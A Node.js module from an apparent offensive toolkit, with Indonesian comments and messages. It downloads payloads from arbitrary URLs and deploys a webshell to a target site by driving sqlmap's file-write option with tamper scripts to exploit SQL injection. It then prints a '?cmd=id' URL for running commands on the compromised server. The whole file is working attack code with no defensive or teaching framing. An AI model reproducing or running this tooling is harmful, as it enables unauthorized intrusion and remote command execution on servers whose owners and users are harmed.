const fs = require('fs');
const path = require('path');
const axios = require('axios');
const chalk = require('chalk');
const config = require('../config.json');
const { runCommand } = require('../core/engine');
const { logToFile } = require('../core/utils');

// Fungsi baru: Mengunduh payload dari URL
async function downloadPayload(url, savePath) {
    console.log(chalk.cyan(`\n[*] Mengunduh payload dari: ${url}`));
    try {
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        fs.writeFileSync(savePath, response.data);
        console.log(chalk.green(`    [V] Berhasil diunduh dan disimpan sementara.`));
        return true;
    } catch (error) {
        console.log(chalk.red(`    [X] Gagal mengunduh payload: ${error.message}`));
        return false;
    }
}

// Fungsi utama Deploy
async function deployShell(targetUrl, shellPath, destPath) {
    console.log(chalk.yellow(`\n[*] Memulai Deploy Webshell...`));
    console.log(chalk.white(`    [+] Target    : ${targetUrl}`));
    console.log(chalk.white(`    [+] Shell     : ${shellPath}`));
    console.log(chalk.white(`    [+] Server Dest: ${destPath}`));
    
    if (!fs.existsSync(shellPath)) {
        console.log(chalk.red(`[X] File webshell tidak ditemukan di: ${shellPath}`));
        return false;
    }

    const param = config.exploit.default_parameter || 'id';
    const args = [
        '-u', targetUrl, '-p', param, '--batch', '--random-agent',
        '--file-write', shellPath, '--file-dest', destPath,
        '--tamper=' + config.exploit.tamper_scripts.join(',')
    ];

    try {
        const result = await runCommand(config.exploit.sqlmap_path, args, { showOutput: true });
        logToFile('http_requests.log', `Attempted shell deploy to ${targetUrl} at ${destPath}. Code: ${result.code}`);

        if (result.output.includes('written to') || result.output.includes('file uploaded')) {
            console.log(chalk.green(`\n[V] SUKSES! Webshell berhasil di-upload.`));
            console.log(chalk.cyan(`    Coba akses: http://${new URL(targetUrl).hostname}${destPath}?cmd=id`));
            return true;
        } else {
            console.log(chalk.red(`\n[X] GAGAL upload. (Cek hak akses FILE atau path).`));
            return false;
        }
    } catch (error) {
        console.log(chalk.red(`\n[X] Error: ${error.message}`));
        return false;
    }
}

module.exports = { deployShell, downloadPayload };